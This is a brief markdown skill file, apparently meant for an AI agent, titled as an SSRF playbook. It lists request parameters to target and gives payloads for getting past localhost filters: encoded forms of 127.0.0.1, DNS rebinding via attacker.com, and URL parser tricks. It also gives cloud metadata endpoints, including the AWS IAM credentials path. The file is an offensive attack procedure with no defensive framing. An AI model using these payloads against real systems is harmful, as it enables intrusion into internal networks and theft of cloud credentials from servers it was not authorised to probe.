---
name: ssrf-server-side-request-forgery
description: SSRF playbook. Use when user input controls URL fetching, webhook targets, document imports, or any server-side HTTP request destination.
---

# SKILL: SSRF

## 1. ENTRY POINTS

- URL parameters: `?url=`, `?webhook=`, `?fetch=`, `?src=`
- Document imports: PDF generators, HTML renderers
- Image fetching, proxy endpoints
- Cloud metadata: `http://169.254.169.254/`

## 2. BYPASS TECHNIQUES

```
# IP encoding
http://2130706433/         (decimal)
http://0x7f000001/         (hex)
http://0177.0.0.1/         (octal)
http://127.1/              (short form)

# DNS rebinding
http://attacker.com → resolves to 127.0.0.1

# URL parser tricks
http://attacker@127.0.0.1
http://127.0.0.1#attacker.com
http://127.0.0.1@attacker.com
```

## 3. CLOUD METADATA

```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:   http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
